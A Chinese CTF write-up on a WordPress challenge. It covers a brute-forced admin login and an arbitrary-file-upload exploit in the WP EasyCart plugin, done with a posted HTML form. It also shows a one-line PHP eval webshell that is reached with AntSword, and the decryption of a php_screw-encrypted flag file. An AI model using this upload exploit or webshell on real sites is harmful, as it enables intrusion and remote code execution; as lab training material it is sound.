# WEB_Wordpress插件漏洞与screw解密

[wp插件上传漏洞]: https://www.exploit-db.com/exploits/35730
[screw解密]: https://github.com/ianxtianxt/screw_decode

拿到题，是wordpress搭建的网站

御剑扫出后台，burpsuite爆破出账号a密码a123456，登录

看hellp提示插件shopping cart，据了解有任意文件上传漏洞，找到插件后台ip/wp-content/plugins/wp-easycart/

本地写下列2.php，然后浏览器运行

```php
<form action="http://aae9f19a.yunyansec.com/wp-content/plugins/wp-easycart/inc/amfphp/administration/banneruploaderscript.php" method="post" enctype="multipart/form-data">
    <input type="hidden" name="datemd5" value="1">
    <input type="file" name="Filedata">
    <input value="Upload!" type="submit">
</form>
```

上传一句话木马1.php   <php @eval($_POST['x'])>

<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210529160850084.png" alt="image-20210529160850084" style="zoom: 67%;" />

查看http://aae9f19a.yunyansec.com/wp-content/plugins/wp-easycart/products/banners/，已经存在webshell，蚁剑连接http://aae9f19a.yunyansec.com/wp-content/plugins/wp-easycart/products/banners/1_1.php，密码x

拿到flag.php

```
	PM9SCREW	?2E.?焜僸~啗助*硎q/峪醢髫l*缍I魣€?甶O>?贤 E\j9z\畇s_-2C汗羯鉩?
肁檔BZ 绁?wj?"F??儒h?瓓銵畽?P	
```

最前面提示是screw加密，又回去找到php_screw.so。 ida逆向，找到<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210529161230229.png" alt="image-20210529161230229" style="zoom:50%;" />

双击cs继续往下找![image-20210529161314572](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210529161314572.png)

将黄线部分后面16进制转换为10进制，保存退出。

打开kali虚拟机，下载screw_decode，make安装，运行下列代码

![image-20210529161453348](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210529161453348.png)

解密成功

![image-20210529161529860](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210529161529860.png)